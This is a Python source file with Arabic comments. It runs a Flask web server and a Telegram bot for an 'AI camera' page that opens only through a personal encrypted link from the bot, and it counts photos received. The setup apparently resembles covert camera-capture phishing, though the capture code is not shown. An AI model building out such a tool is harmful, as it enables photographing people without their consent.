# from flask import Flask, request, jsonify, make_response
# from threading import Thread
# from config import logger
# from encryption import decrypt_id
# from html_page import get_html_page

# app = Flask(__name__)

# @app.after_request
# def add_security_headers(response):
#     """إضافة رؤوس الأمان"""
#     response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline' 'unsafe-eval'; style-src 'self' https://fonts.googleapis.com https://cdnjs.cloudflare.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: blob:; connect-src 'self' https://api.telegram.org; frame-ancestors 'none';"
#     response.headers['X-Content-Type-Options'] = 'nosniff'
#     response.headers['X-Frame-Options'] = 'DENY'
#     response.headers['X-XSS-Protection'] = '1; mode=block'
#     return response

# @app.route('/')
# def home():
#     """الصفحة الرئيسية"""
#     encrypted_id = request.args.get('q')
#     if encrypted_id:
#         return get_html_page()
#     else:
#         return make_response("""
#         <!DOCTYPE html>
#         <html>
#         <head><title>كاميرا الذكاء الاصطناعي</title></head>
#         <body style="text-align:center;padding:50px;background:linear-gradient(135deg,#0c2461,#1e3799);color:white;">
#             <h1>📸 كاميرا الذكاء الاصطناعي</h1>
#             <p>يرجى الحصول على رابطك الشخصي من البوت على تلجرام.</p>
#         </body>
#         </html>
#         """, 403)

# @app.route('/decrypt', methods=['POST'])
# def decrypt_endpoint():
#     """فك تشفير الـ ID"""
#     try:
#         data = request.json
#         encrypted = data.get('encrypted')
#         if not encrypted:
#             return jsonify({"valid": False}), 400
        
#         user_id = decrypt_id(encrypted)
#         if user_id:
#             return jsonify({"valid": True, "chat_id": user_id})
#         return jsonify({"valid": False}), 400
#     except Exception as e:
#         logger.error(f"Decrypt error: {e}")
#         return jsonify({"valid": False}), 500

# @app.route('/webhook', methods=['POST'])
# def webhook():
#     """Webhook للبوت"""
#     return jsonify({"status": "ok"})

# def run():
#     """تشغيل التطبيق"""
#     app.run(host='0.0.0.0', port=8080)

# def keep_alive():
#     """تشغيل الخادم في thread منفصل"""
#     t = Thread(target=run)
#     t.daemon = True
#     t.start()



# app.py
import os
import threading
import time
import logging

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# استيراد الخادم الوسيط
from api_server import app as api_app

# استيراد البوت
from bot_handlers import bot, user_stats, total_photos_received

# دالة تشغيل البوت
def run_bot():
    while True:
        try:
            logger.info("🤖 Starting bot...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(10)
            logger.info("Restarting bot...")

if __name__ == "__main__":
    # تشغيل البوت في خيط منفصل
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # تشغيل خادم الويب
    logger.info("🌐 Starting web server on port 8080...")
    api_app.run(host='0.0.0.0', port=8080)
